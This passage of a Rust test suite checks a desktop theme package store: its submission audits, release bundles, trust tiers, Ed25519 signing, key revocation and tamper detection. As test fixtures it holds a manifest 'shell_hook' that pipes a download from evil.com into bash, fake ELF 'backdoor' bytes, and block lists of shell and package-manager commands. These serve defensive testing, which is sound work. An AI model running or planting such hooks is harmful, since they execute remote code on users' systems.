        assert!(audit.binary_executables_found.is_empty());
        assert!(audit.script_hooks_found.is_empty());
    }

    #[test]
    fn test_store_audit_fails_when_binary_present() {
        let sandbox = TestSandbox::new("audit-fail");
        let pkg_dir = sandbox.root.join("infected-pkg");
        fs::create_dir_all(pkg_dir.join("files")).unwrap();

        let manifest = create_test_manifest("infected-pkg", "1.0.0");
        fs::write(
            pkg_dir.join("ryzora.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();

        // Valid style.css
        fs::write(pkg_dir.join("files/style.css"), "body { color: cyan; }").unwrap();
        // Malicious ELF binary placed inside package
        fs::write(
            pkg_dir.join("files/backdoor"),
            [0x7f, b'E', b'L', b'F', 1, 2, 3, 4],
        )
        .unwrap();

        let audit = audit_store_submission_internal(&pkg_dir).unwrap();
        assert!(!audit.passed, "Audit must fail when binary is detected");
        assert_eq!(audit.binary_executables_found.len(), 1);
        assert_eq!(audit.score, 0, "Score must be 0 for compiled binaries");
    }

    #[test]
    fn test_build_distribution_release_generates_canonical_bundle() {
        let sandbox = TestSandbox::new("bundle-gen");
        let src_pkg = sandbox.root.join("source-pkg");
        fs::create_dir_all(src_pkg.join("files")).unwrap();

        let manifest = create_test_manifest("cyber-theme", "1.2.0");
        fs::write(
            src_pkg.join("ryzora.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();
        fs::write(src_pkg.join("files/style.css"), "/* cyber neon */").unwrap();

        let export_dir = sandbox.root.join("releases");
        fs::create_dir_all(&export_dir).unwrap();

        let result = build_distribution_release_internal(
            &src_pkg,
            &export_dir,
            ReleaseChannel::Stable,
            Some("Initial stable release for Ryzora community".to_string()),
            Some("@silentbyte".to_string()),
        )
        .unwrap();

        assert!(result.success);
        let bundle_path = PathBuf::from(&result.bundle_dir);
        assert!(bundle_path.join("ryzora.json").is_file());
        assert!(bundle_path.join("release.json").is_file());
        assert!(bundle_path.join("checksums.sha256").is_file());
        assert!(bundle_path.join("SUBMISSION.md").is_file());
        assert!(bundle_path.join("files/style.css").is_file());

        // Verify checksums file content
        let checksums_raw = fs::read_to_string(bundle_path.join("checksums.sha256")).unwrap();
        assert!(checksums_raw.contains("files/style.css"));

        // Verify release.json content
        let release_raw = fs::read_to_string(bundle_path.join("release.json")).unwrap();
        let release_data: DistributionRelease = serde_json::from_str(&release_raw).unwrap();
        assert_eq!(release_data.package_id, "cyber-theme");
        assert_eq!(release_data.version, "1.2.0");
        assert_eq!(release_data.channel, ReleaseChannel::Stable);
        assert_eq!(release_data.maintainer, Some("@silentbyte".to_string()));
        assert_eq!(release_data.tree_hash, result.tree_hash);

        // Verify SUBMISSION.md markdown formatting
        let sub_md = fs::read_to_string(bundle_path.join("SUBMISSION.md")).unwrap();
        assert!(sub_md.contains("Store Package Submission: Cyber Neon Theme"));
        assert!(sub_md.contains("**Release Channel:** `stable`"));
        assert!(sub_md.contains("Canonical Tree Hash"));
    }

    #[test]
    fn test_distribution_release_channels_serde() {
        assert_eq!(
            serde_json::to_string(&ReleaseChannel::Stable).unwrap(),
            "\"stable\""
        );
        assert_eq!(
            serde_json::to_string(&ReleaseChannel::Beta).unwrap(),
            "\"beta\""
        );
        assert_eq!(
            serde_json::to_string(&ReleaseChannel::Nightly).unwrap(),
            "\"nightly\""
        );

        let s: ReleaseChannel = serde_json::from_str("\"stable\"").unwrap();
        assert_eq!(s, ReleaseChannel::Stable);
        let b: ReleaseChannel = serde_json::from_str("\"beta\"").unwrap();
        assert_eq!(b, ReleaseChannel::Beta);
        let n: ReleaseChannel = serde_json::from_str("\"nightly\"").unwrap();
        assert_eq!(n, ReleaseChannel::Nightly);
    }

    #[test]
    fn test_distribution_trust_tiers_serde() {
        assert_eq!(
            serde_json::to_string(&TrustTier::Official).unwrap(),
            "\"official\""
        );
        assert_eq!(
            serde_json::to_string(&TrustTier::Verified).unwrap(),
            "\"verified\""
        );
        assert_eq!(
            serde_json::to_string(&TrustTier::Community).unwrap(),
            "\"community\""
        );
        assert_eq!(
            serde_json::to_string(&TrustTier::Untrusted).unwrap(),
            "\"untrusted\""
        );
    }

    #[test]
    fn test_distribution_security_zero_shell_execution() {
        let src = include_str!("distribution.rs");
        let non_test_src = src.split("#[cfg(test)]").next().unwrap_or(src);
        let banned_cmd = format!("{}::{}", "std::process", "Command");
        assert!(
            !non_test_src.contains(&banned_cmd),
            "distribution.rs must NOT use std::process::Command"
        );
        assert!(
            !non_test_src.contains("Command::new"),
            "distribution.rs must NOT use Command::new"
        );
        assert!(
            !non_test_src.contains("std::os::unix::process"),
            "distribution.rs must NOT use unix process execution"
        );
    }

    #[test]
    fn test_store_audit_rejects_missing_manifest() {
        let sandbox = TestSandbox::new("no-manifest");
        let pkg_dir = sandbox.root.join("pkg");
        fs::create_dir_all(&pkg_dir).unwrap();

        let res = audit_store_submission_internal(&pkg_dir);
        assert!(res.is_err());
        let err = res.err().unwrap();
        assert!(err.contains("neither"));
    }

    #[test]
    fn test_store_audit_rejects_zero_files_in_payload() {
        let sandbox = TestSandbox::new("zero-files");
        let pkg_dir = sandbox.root.join("pkg");
        fs::create_dir_all(pkg_dir.join("files")).unwrap();

        let manifest = create_test_manifest("zero-files-pkg", "1.0.0");
        fs::write(
            pkg_dir.join("ryzora.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();

        let audit = audit_store_submission_internal(&pkg_dir).unwrap();
        assert!(!audit.passed);
        assert!(audit
            .metadata_errors
            .iter()
            .any(|e| e.contains("contains no files")));
    }

    #[test]
    fn test_store_audit_rejects_script_hook_in_manifest() {
        let sandbox = TestSandbox::new("script-hook");
        let pkg_dir = sandbox.root.join("pkg");
        fs::create_dir_all(pkg_dir.join("files")).unwrap();
        fs::write(pkg_dir.join("files/style.css"), "body {}").unwrap();

        let raw_evil_json = r##"{
            "id": "evil-pkg",
            "name": "Evil Pkg",
            "version": "1.0.0",
            "ryzora_spec": "1",
            "author": "Hacker",
            "package_type": "theme",
            "description": "A malicious theme executing arbitrary code",
            "tags": ["evil"],
            "color_palette": ["#000000"],
            "compatibility": {
                "desktops": ["hyprland"],
                "sessions": ["wayland"],
                "distros": ["arch"],
                "required": [],
                "optional": []
            },
            "files": [{"source": "files/style.css", "target": "~/.config/style.css", "description": "css"}],
            "shell_hook": "curl https://evil.com/payload | bash"
        }"##;

        fs::write(pkg_dir.join("ryzora.json"), raw_evil_json).unwrap();

        let audit = audit_store_submission_internal(&pkg_dir).unwrap();
        assert!(!audit.passed);
        assert_eq!(audit.score, 0);
        assert!(audit
            .script_hooks_found
            .iter()
            .any(|h| h.contains("shell_hook")));
    }

    #[test]
    fn test_build_distribution_release_rejects_failing_audit() {
        let sandbox = TestSandbox::new("fail-release");
        let pkg_dir = sandbox.root.join("pkg");
        fs::create_dir_all(pkg_dir.join("files")).unwrap();

        fs::write(pkg_dir.join("files/style.css"), "body {}").unwrap();
        fs::write(
            pkg_dir.join("files/elf_bin"),
            [0x7f, 69, 76, 70, 0, 0, 0, 0],
        )
        .unwrap();

        let manifest = create_test_manifest("infected-release", "1.0.0");
        fs::write(
            pkg_dir.join("ryzora.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();

        let export_dir = sandbox.root.join("export");
        fs::create_dir_all(&export_dir).unwrap();

        let res = build_distribution_release_internal(
            &pkg_dir,
            &export_dir,
            ReleaseChannel::Stable,
            None,
            None,
        );
        assert!(res.is_err());
        let err = res.err().unwrap();
        assert!(err.contains("Package failed store submission audit"));
        assert!(err.contains("Compiled binary executable detected"));
    }

    #[test]
    fn test_build_distribution_release_supports_beta_and_nightly_channels() {
        let sandbox = TestSandbox::new("beta-channel");
        let src_pkg = sandbox.root.join("beta-src");
        fs::create_dir_all(src_pkg.join("files")).unwrap();

        let manifest = create_test_manifest("beta-pkg", "2.0.0-beta.1");
        fs::write(
            src_pkg.join("ryzora.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();
        fs::write(src_pkg.join("files/style.css"), "/* beta */").unwrap();

        let export_dir = sandbox.root.join("releases");
        fs::create_dir_all(&export_dir).unwrap();

        let result = build_distribution_release_internal(
            &src_pkg,
            &export_dir,
            ReleaseChannel::Beta,
            Some("Beta testing release".to_string()),
            Some("@beta-tester".to_string()),
        )
        .unwrap();

        assert_eq!(result.channel, ReleaseChannel::Beta);
        assert!(result.submission_text.contains("Release Channel"));
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Phase 11.1: Interactive End-to-End Audit Tests
    // ─────────────────────────────────────────────────────────────────────────

    #[test]
    fn test_phase11_1_full_pipeline_audit() {
        let sandbox = TestSandbox::new("p11-1-pipeline");

        // 1. Authoring draft creation
        let conf_file = sandbox.root.join("hyprland.conf");
        fs::write(
            &conf_file,
            "# Hyprland config for Phase 11.1\ngeneral {\n  gaps_in = 5\n}\n",
        )
        .unwrap();
        let bar_file = sandbox.root.join("waybar.jsonc");
        fs::write(
            &bar_file,
            "{\n  \"layer\": \"top\",\n  \"position\": \"top\"\n}\n",
        )
        .unwrap();

        let draft = crate::authoring::PackageDraft {
            id: "nord-rice-beta".to_string(),
            name: "Nord Rice Beta".to_string(),
            version: "1.0.0-beta.1".to_string(),
            author: "NordArchitect".to_string(),
            package_type: PackageType::Rice,
            description: "A complete Nord aesthetic rice tested during Phase 11.1 audit"
                .to_string(),
            tags: vec![
                "hyprland".to_string(),
                "nord".to_string(),
                "beta".to_string(),
            ],
            color_palette: vec!["#2e3440".to_string(), "#88c0d0".to_string()],
            compatibility: crate::manifest::ManifestCompatibility {
                desktops: vec!["hyprland".to_string()],
                sessions: vec!["wayland".to_string()],
                distros: vec![],
                required: vec![],
                optional: vec![],
            },
            dependencies: vec![],
            files: vec![
                crate::authoring::FileMappingDraft {
                    source_path: conf_file.to_string_lossy().to_string(),
                    target: "~/.config/hypr/hyprland.conf".to_string(),
                    package_rel_path: None,
                    description: "Main Hyprland config".to_string(),
                },
                crate::authoring::FileMappingDraft {
                    source_path: bar_file.to_string_lossy().to_string(),
                    target: "~/.config/waybar/config.jsonc".to_string(),
                    package_rel_path: Some("files/waybar/config.jsonc".to_string()),
                    description: "Waybar status bar config".to_string(),
                },
            ],
        };

        // 2. Validate & Build Draft
        let val_res = crate::authoring::validate_package_draft_internal(&draft);
        assert!(
            val_res.valid,
            "Draft validation should pass: {:?}",
            val_res.errors
        );

        let draft_build_dir = sandbox.root.join("draft_output");
        fs::create_dir_all(&draft_build_dir).unwrap();
        let build_res = crate::authoring::create_package_bundle(draft, &draft_build_dir).unwrap();
        assert!(build_res.success);
        let authored_pkg_dir = PathBuf::from(&build_res.package_dir);
        assert!(authored_pkg_dir.join("ryzora.json").is_file());
        assert!(authored_pkg_dir.join("manifest.json").is_file());

        // 3. Pre-Flight Store Audit
        let audit = audit_store_submission_internal(&authored_pkg_dir).unwrap();
        assert!(audit.passed, "Store audit should pass for clean dotfiles");
        assert_eq!(audit.score, 100);
        assert!(
            audit.binary_executables_found.is_empty(),
            "Must have zero compiled binaries"
        );
        assert!(
            audit.script_hooks_found.is_empty(),
            "Must have zero script hooks"
        );
        assert_eq!(audit.total_files, 2);
        assert!(!audit.tree_hash.is_empty());

        // 4. Build Distribution Release Bundle
        let releases_dir = sandbox.root.join("releases");
        fs::create_dir_all(&releases_dir).unwrap();

        let dist_res = build_distribution_release_internal(
            &authored_pkg_dir,
            &releases_dir,
            ReleaseChannel::Beta,
            Some("Phase 11.1 interactive audit release".to_string()),
            Some("@silentbyte".to_string()),
        )
        .unwrap();

        assert!(dist_res.success);
        assert_eq!(dist_res.channel, ReleaseChannel::Beta);
        assert!(!dist_res.tree_hash.is_empty());

        // Inspect distribution release bundle artifacts
        let bundle_dir = PathBuf::from(&dist_res.bundle_dir);
        assert!(bundle_dir.join("ryzora.json").is_file());
        assert!(bundle_dir.join("manifest.json").is_file());
        assert!(bundle_dir.join("release.json").is_file());
        assert!(bundle_dir.join("checksums.sha256").is_file());
        assert!(bundle_dir.join("SUBMISSION.md").is_file());
        assert!(bundle_dir.join("files/waybar/config.jsonc").is_file());

        // Parse and verify release.json
        let rel_content = fs::read_to_string(bundle_dir.join("release.json")).unwrap();
        let release_meta: DistributionRelease = serde_json::from_str(&rel_content).unwrap();
        assert_eq!(release_meta.package_id, "nord-rice-beta");
        assert_eq!(release_meta.channel, ReleaseChannel::Beta);
        assert_eq!(release_meta.trust_tier, TrustTier::Community); // Honest default
        assert_eq!(release_meta.maintainer, Some("@silentbyte".to_string()));
        assert_eq!(release_meta.files_count, 2);

        // 5. Publish Distribution Bundle to Local Repository
        let repo_dir = sandbox.root.join("test_repo");
        fs::create_dir_all(repo_dir.join("packages")).unwrap();
        let initial_repo_index = crate::repository::RepositoryIndex {
            schema: 1,
            id: "test-community-repo".to_string(),
            name: "Test Community Repository".to_string(),
            version: "1.0.0".to_string(),
            description: "Repository for Phase 11.1 audit".to_string(),
            packages: vec![],
        };
        fs::write(
            repo_dir.join("repository.json"),
            serde_json::to_string_pretty(&initial_repo_index).unwrap(),
        )
        .unwrap();

        let pub_res = crate::authoring::export_to_repository(&bundle_dir, &repo_dir).unwrap();
        assert!(pub_res.success);

        // Verify repository index inherited release metadata
        let updated_repo_raw = fs::read_to_string(repo_dir.join("repository.json")).unwrap();
        let updated_repo_index: crate::repository::RepositoryIndex =
            serde_json::from_str(&updated_repo_raw).unwrap();
        assert_eq!(updated_repo_index.packages.len(), 1);
        let repo_entry = &updated_repo_index.packages[0];
        assert_eq!(repo_entry.id, "nord-rice-beta");
        assert_eq!(repo_entry.release_channel, Some(ReleaseChannel::Beta));
        assert_eq!(repo_entry.maintainer, Some("@silentbyte".to_string()));
        assert_eq!(repo_entry.trust_tier, Some(TrustTier::Community));
        assert_eq!(repo_entry.content_hash, Some(dist_res.tree_hash.clone()));

        // 6. Refresh & Discover in RepositoryManager
        let local_repo = crate::repository::LocalRepository::load_from_dir(&repo_dir).unwrap();
        let mut manager = crate::repository::RepositoryManager::new();
        manager.add_repository(Box::new(local_repo));
        let _ = manager.refresh_all();

        let all_packages = manager.list_all_packages().unwrap();
        assert_eq!(all_packages.len(), 1);
        let pkg_item = &all_packages[0];
        assert_eq!(pkg_item.id, "nord-rice-beta");
        assert_eq!(pkg_item.release_channel, Some(ReleaseChannel::Beta));
        assert_eq!(pkg_item.trust_tier, Some(TrustTier::Community));
        assert_eq!(pkg_item.maintainer, Some("@silentbyte".to_string()));
        assert_eq!(pkg_item.integrity_status, "verified");

        // 7. Test Truth-in-Advertising & Filtering Invariants
        // Community packages must NOT match Official or Verified filter
        let matches_official_filter = pkg_item.trust_tier == Some(TrustTier::Official);
        let matches_verified_filter = pkg_item.trust_tier == Some(TrustTier::Verified)
            || pkg_item.trust_tier == Some(TrustTier::Official);
        let matches_community_filter = pkg_item.trust_tier == Some(TrustTier::Community);

        assert!(
            !matches_official_filter,
            "Community package must not match Official filter"
        );
        assert!(
            !matches_verified_filter,
            "Community package must not match Verified filter"
        );
        assert!(matches_community_filter, "Must match Community filter");

        // Channel filter
        assert_eq!(pkg_item.release_channel, Some(ReleaseChannel::Beta));
        assert_ne!(pkg_item.release_channel, Some(ReleaseChannel::Stable));
    }

    #[test]
    fn test_phase11_1_trust_tier_and_checksum_separation() {
        let sandbox = TestSandbox::new("trust-vs-checksum");
        let pkg_dir = sandbox.root.join("valid-community-pkg");
        fs::create_dir_all(pkg_dir.join("files")).unwrap();

        let manifest = create_test_manifest("honesty-pkg", "1.0.0");
        fs::write(
            pkg_dir.join("ryzora.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();
        fs::write(pkg_dir.join("files/style.css"), "body { color: cyan; }").unwrap();

        let audit = audit_store_submission_internal(&pkg_dir).unwrap();
        assert!(audit.passed);

        let export_dir = sandbox.root.join("export");
        fs::create_dir_all(&export_dir).unwrap();

        let result = build_distribution_release_internal(
            &pkg_dir,
            &export_dir,
            ReleaseChannel::Stable,
            None,
            None,
        )
        .unwrap();

        let bundle_dir = PathBuf::from(&result.bundle_dir);
        let release_json_raw = fs::read_to_string(bundle_dir.join("release.json")).unwrap();
        let release: DistributionRelease = serde_json::from_str(&release_json_raw).unwrap();

        // Checksum is verified, but trust tier is Community
        assert_eq!(release.trust_tier, TrustTier::Community);
        assert_eq!(release.author.verified, false);
    }

    #[test]
    fn test_phase11_1_distribution_bundle_tamper_detection() {
        let sandbox = TestSandbox::new("tamper-detect");
        let pkg_dir = sandbox.root.join("tamper-pkg");
        fs::create_dir_all(pkg_dir.join("files")).unwrap();

        let manifest = create_test_manifest("tamper-pkg", "1.0.0");
        fs::write(
            pkg_dir.join("ryzora.json"),
            serde_json::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();
        fs::write(pkg_dir.join("files/style.css"), "body { margin: 0; }").unwrap();

        let export_dir = sandbox.root.join("releases");
        fs::create_dir_all(&export_dir).unwrap();

        let result = build_distribution_release_internal(
            &pkg_dir,
            &export_dir,
            ReleaseChannel::Stable,
            None,
            None,
        )
        .unwrap();

        let bundle_dir = PathBuf::from(&result.bundle_dir);
        let checksums_file = bundle_dir.join("checksums.sha256");
        let orig_checksums = fs::read_to_string(&checksums_file).unwrap();

        // Verify initial checksum matches
        let style_file = bundle_dir.join("files/style.css");
        let style_hash = compute_file_sha256(&style_file).unwrap();
        assert!(orig_checksums.contains(&style_hash));

        // Tamper with payload file
        fs::write(&style_file, "body { margin: 0; } /* malicious addition */").unwrap();
        let tampered_hash = compute_file_sha256(&style_file).unwrap();

        assert_ne!(style_hash, tampered_hash);
        assert!(
            !orig_checksums.contains(&tampered_hash),
            "Tampered file hash must not match recorded checksums"
        );
    }

    #[test]
    fn test_phase11_1_zero_command_execution() {
        let src_dir = Path::new("src");
        let forbidden_needles = [
            "std::process::Command",
            "process::Command",
            "Command::new",
            "\"sh\"",
            "\"bash\"",
            "\"sudo\"",
            "\"pkexec\"",
            "\"pacman\"",
            "\"yay\"",
        ];

        let files = [
            "distribution.rs",
            "authoring.rs",
            "repository.rs",
            "installer.rs",
            "manifest.rs",
            "snapshot.rs",
            "lib.rs",
        ];

        for file_name in &files {
            let file_path = src_dir.join(file_name);
            if file_path.is_file() {
                let code = fs::read_to_string(&file_path).unwrap();
                let prod_code = code.split("#[cfg(test)]").next().unwrap_or(&code);
                for pat in &forbidden_needles {
                    assert!(
                        !prod_code.contains(pat),
                        "Production file '{}' must not contain forbidden pattern '{}'",
                        file_name,
                        pat
                    );
                }
            }
        }
    }

    fn copy_test_dir(src: &Path, dst: &Path) {
        fs::create_dir_all(dst).unwrap();
        for entry in fs::read_dir(src).unwrap() {
            let entry = entry.unwrap();
            let ty = entry.file_type().unwrap();
            if ty.is_dir() {
                copy_test_dir(&entry.path(), &dst.join(entry.file_name()));
            } else {
                fs::copy(entry.path(), dst.join(entry.file_name())).unwrap();
            }
        }
    }

    fn mock_dist_system() -> crate::system::SystemInfo {
        crate::system::SystemInfo {
            distro_name: "Arch Linux".to_string(),
            distro_id: "arch".to_string(),
            distro_family: "arch".to_string(),
            distro_version: "Rolling".to_string(),
            kernel_version: "6.12.0".to_string(),
            desktop_environment: "hyprland".to_string(),
            window_manager: "hyprland".to_string(),
            session_type: "wayland".to_string(),
            shell: "zsh".to_string(),
            terminal: "kitty".to_string(),
            installed_components: vec![],
        }
    }

    #[test]
    fn test_phase12_full_pipeline_audit() {
        use crate::crypto::{
            compute_key_fingerprint, evaluate_package_directory_crypto, generate_ed25519_keypair,
            sign_package_tree_hash, CryptographicStatus, SignerIdentity, TrustStore,
            TrustedKeyEntry,
        };
        use crate::installer::install_package_in_with_trust;

        let sandbox = TestSandbox::new("p12-crypto-pipeline");

        // 1. Setup Keys: Core Root Keypair and Author Keypair
        let (_core_signing_key, core_verifying_key) = generate_ed25519_keypair();
        let core_pubkey_hex = hex::encode(core_verifying_key.as_bytes());

        let (author_signing_key, author_verifying_key) = generate_ed25519_keypair();
        let author_pubkey_hex = hex::encode(author_verifying_key.as_bytes());
        let author_key_id = compute_key_fingerprint(&author_verifying_key);

        let mut trust_store = TrustStore::new_test_store(&[&core_pubkey_hex], &[], &[]);

        // 2. Draft and Build Package
        let conf_file = sandbox.root.join("hyprland.conf");
        fs::write(
            &conf_file,
            "# Phase 12 Rice
general {
  border_size = 2
}
",
        )
        .unwrap();

        let draft = crate::authoring::PackageDraft {
            id: "catppuccin-crypto-rice".to_string(),
            name: "Catppuccin Crypto Rice".to_string(),
            version: "1.0.0".to_string(),
            author: "CryptoDev".to_string(),
            package_type: PackageType::Rice,
            description: "Phase 12 signed package".to_string(),
            tags: vec!["catppuccin".to_string(), "signed".to_string()],
            color_palette: vec!["#1e1e2e".to_string(), "#cba6f7".to_string()],
            compatibility: crate::manifest::ManifestCompatibility {
                desktops: vec!["hyprland".to_string()],
                sessions: vec!["wayland".to_string()],
                distros: vec![],
                required: vec![],
                optional: vec![],
            },
            dependencies: vec![],
            files: vec![crate::authoring::FileMappingDraft {
                source_path: conf_file.to_string_lossy().to_string(),
                target: "~/.config/hypr/hyprland.conf".to_string(),
                package_rel_path: None,
                description: "Hyprland configuration".to_string(),
            }],
        };

        let draft_build_dir = sandbox.root.join("draft_output");
        fs::create_dir_all(&draft_build_dir).unwrap();
        let build_res = crate::authoring::create_package_bundle(draft, &draft_build_dir).unwrap();
        let authored_pkg_dir = PathBuf::from(&build_res.package_dir);

        // 3. Build Distribution Release Bundle
        let releases_dir = sandbox.root.join("releases");
        fs::create_dir_all(&releases_dir).unwrap();

        let dist_res = build_distribution_release_internal(
            &authored_pkg_dir,
            &releases_dir,
            ReleaseChannel::Stable,
            Some("Release signed with Ed25519".to_string()),
            Some("@cryptodev".to_string()),
        )
        .unwrap();

        let bundle_dir = PathBuf::from(&dist_res.bundle_dir);
        let tree_hash = dist_res.tree_hash.clone();

        // Sign the package explicitly with author_keypair into release.sig
        let sig_meta = sign_package_tree_hash(
            &author_signing_key,
            "catppuccin-crypto-rice",
            &tree_hash,
            SignerIdentity {
                author_id: "cryptodev".to_string(),
                name: "CryptoDev".to_string(),
                handle: Some("@cryptodev".to_string()),
            },
        )
        .unwrap();

        fs::write(
            bundle_dir.join("release.sig"),
            serde_json::to_string_pretty(&sig_meta).unwrap(),
        )
        .unwrap();

        // 4. Publish to Repository
        let repo_dir = sandbox.root.join("test_repo");
        fs::create_dir_all(repo_dir.join("packages")).unwrap();
        let initial_repo_index = crate::repository::RepositoryIndex {
            schema: 1,
            id: "crypto-repo".to_string(),
            name: "Crypto Repository".to_string(),
            version: "1.0.0".to_string(),
            description: "Repo for Phase 12 audit".to_string(),
            packages: vec![],
        };
        fs::write(
            repo_dir.join("repository.json"),
            serde_json::to_string_pretty(&initial_repo_index).unwrap(),
        )
        .unwrap();

        let pub_res = crate::authoring::export_to_repository(&bundle_dir, &repo_dir).unwrap();
        assert!(pub_res.success);

        // Verify repository index captured signature
        let repo_raw = fs::read_to_string(repo_dir.join("repository.json")).unwrap();
        let repo_index: crate::repository::RepositoryIndex =
            serde_json::from_str(&repo_raw).unwrap();
        assert_eq!(repo_index.packages.len(), 1);
        let repo_pkg = &repo_index.packages[0];
        assert!(
            repo_pkg.signature.is_some(),
            "Repository entry must preserve signature"
        );
        assert_eq!(repo_pkg.signature.as_ref().unwrap().key_id, author_key_id);

        // 5. Discover & Evaluate: Unknown key MUST NOT be Verified or Official (HARD RULE)
        let manifest = crate::installer::load_package_manifest(&bundle_dir).unwrap();
        let eval =
            evaluate_package_directory_crypto(&bundle_dir, &manifest, None, &trust_store).unwrap();

        assert!(
            eval.is_valid,
            "Ed25519 signature must be mathematically valid"
        );
        assert!(!eval.is_trusted, "Key is not yet in trust store");
        assert_eq!(
            eval.status,
            CryptographicStatus::SelfSignedUnvetted,
            "Self-signed unvetted key must evaluate to SelfSignedUnvetted"
        );
        assert!(
            eval.can_install,
            "Community users can install unvetted packages"
        );

        // 6. Pre-Install & Install Gate with Self-Signed Package
        let home_dir = sandbox.root.join("home");
        fs::create_dir_all(&home_dir).unwrap();
        let snapshots_dir = sandbox.root.join("snapshots");
        let installed_dir = sandbox.root.join("installed");
        let staging_dir = sandbox.root.join("staging");
        let sys = mock_dist_system();

        let install_res = install_package_in_with_trust(
            &bundle_dir,
            &snapshots_dir,
            &installed_dir,
            &staging_dir,
            &home_dir,
            &sys,
            &trust_store,
        )
        .unwrap();

        assert!(install_res.success);
        let record_raw =
            fs::read_to_string(installed_dir.join("catppuccin-crypto-rice.json")).unwrap();
        let record: crate::installer::InstalledPackageRecord =
            serde_json::from_str(&record_raw).unwrap();
        assert_eq!(
            record.cryptographic_status,
            Some(CryptographicStatus::SelfSignedUnvetted)
        );
        assert_eq!(record.signer_key_id, Some(author_key_id.clone()));

        // 7. Promote Key to Trusted Author (Vetting)
        trust_store
            .add_trusted_key(TrustedKeyEntry {
                key_id: author_key_id.clone(),
                public_key: author_pubkey_hex.clone(),
                author_name: "CryptoDev".to_string(),
                role: "community_verified".to_string(),
                added_at: "2026-09-09T12:00:00Z".to_string(),
                notes: "Vetted community author".to_string(),
            })
            .unwrap();

        let vetted_eval =
            evaluate_package_directory_crypto(&bundle_dir, &manifest, None, &trust_store).unwrap();

        assert!(vetted_eval.is_trusted);
        assert_eq!(
            vetted_eval.status,
            CryptographicStatus::AuthorVerified,
            "Vetted trusted key must evaluate to AuthorVerified"
        );

        // 8. Revocation Gate: Fail Closed before snapshot/staging
        trust_store
            .revoke_key(
                &author_key_id,
                &author_pubkey_hex,
                "Private key compromised in incident report",
            )
            .unwrap();

        let revoked_eval =
            evaluate_package_directory_crypto(&bundle_dir, &manifest, None, &trust_store).unwrap();

        assert!(!revoked_eval.is_valid);
        assert!(!revoked_eval.can_install, "Revoked key must block install");
        assert_eq!(revoked_eval.status, CryptographicStatus::RevokedKey);

        // Attempt install with revoked key
        let revoked_install_err = install_package_in_with_trust(
            &bundle_dir,
            &snapshots_dir,
            &installed_dir,
            &staging_dir,
            &home_dir,
            &sys,
            &trust_store,
        );

        assert!(revoked_install_err.is_err());
        let err_str = revoked_install_err.err().unwrap();
        assert!(
            err_str.contains("Cryptographic Verification Block")
                || err_str.contains("Cryptographic Verification Error")
        );
        assert!(err_str.contains("revoked"));

        // 9. Tamper Detection Gate: Fail Closed on corrupt signature/content
        let untrusted_store = TrustStore::new_test_store(&[], &[], &[]);
        let tampered_bundle = sandbox.root.join("tampered_bundle");
        copy_test_dir(&bundle_dir, &tampered_bundle);

        // Tamper with file
        fs::write(
            tampered_bundle.join(&manifest.files[0].source),
            "# Malicious injection into dotfile
exec-once = evil
",
        )
        .unwrap();

        let tampered_manifest = crate::installer::load_package_manifest(&tampered_bundle).unwrap();
        let tampered_eval = evaluate_package_directory_crypto(
            &tampered_bundle,
            &tampered_manifest,
            None,
            &untrusted_store,
        )
        .unwrap();

        assert!(!tampered_eval.is_valid);
        assert!(!tampered_eval.can_install);
        assert_eq!(tampered_eval.status, CryptographicStatus::InvalidSignature);

        let tampered_err = install_package_in_with_trust(
            &tampered_bundle,
            &snapshots_dir,
            &installed_dir,
            &staging_dir,
            &home_dir,
            &sys,
            &untrusted_store,
        );
        assert!(tampered_err.is_err());
        let tampered_msg = tampered_err.unwrap_err();
        assert!(
            tampered_msg.contains("Cryptographic Verification Block")
                || tampered_msg.contains("Cryptographic Verification Error")
        );
        assert!(
            tampered_msg.contains("Tampering detected")
                || tampered_msg.contains("InvalidSignature")
        );

        // 10. Official Metadata with Non-Core Key Gate (Rule 6)
        let official_impersonator_store = TrustStore::new_test_store(&[&core_pubkey_hex], &[], &[]);

        let imp_eval = evaluate_package_directory_crypto(
            &bundle_dir,
            &manifest,
            Some(TrustTier::Official),
            &official_impersonator_store,
        )
        .unwrap();

        assert!(
            !imp_eval.can_install,
            "Official claim without Core Root key must fail closed"
        );
        assert_eq!(imp_eval.status, CryptographicStatus::OfficialImpersonation);
    }

    #[test]
    fn test_phase12_zero_command_execution() {
        let src_dir = Path::new("src");
        let forbidden_needles = [
            "std::process::Command",
            "process::Command",
            "Command::new",
            r#""sh""#,
            r#""bash""#,
            r#""sudo""#,
            r#""pkexec""#,
            r#""pacman""#,
            r#""yay""#,
            r#""paru""#,
            r#""apt""#,
            r#""gpg""#,
            r#""openssl""#,
        ];

        let files = [
            "crypto.rs",
            "distribution.rs",
            "authoring.rs",
            "repository.rs",
            "installer.rs",
            "manifest.rs",
            "snapshot.rs",
            "lib.rs",
        ];

        for file_name in &files {
            let file_path = src_dir.join(file_name);
            if file_path.is_file() {
                let code = fs::read_to_string(&file_path).unwrap();
                let prod_code = code.split("#[cfg(test)]").next().unwrap_or(&code);
                for pat in &forbidden_needles {
                    assert!(
                        !prod_code.contains(pat),
                        "Production file '{}' must not contain forbidden pattern '{}'",
                        file_name,
                        pat
                    );
                }
            }
        }
    }
}
